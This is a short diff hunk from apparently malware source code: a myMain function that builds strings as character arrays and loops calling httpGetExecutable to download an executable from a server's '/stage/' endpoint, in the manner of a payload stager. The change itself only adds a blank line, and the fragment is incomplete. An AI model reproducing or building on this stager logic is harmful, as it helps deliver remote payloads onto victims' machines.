@@ -633,6 +633,7 @@ void myMain()
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
     WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
+
     while (pPrimalDll->pBuffer == NULL)
     {
         pPrimalDll->pBuffer = httpGetExecutable(api, &pPrimalDll->Size, wcStageEndpoint, wServer, port);
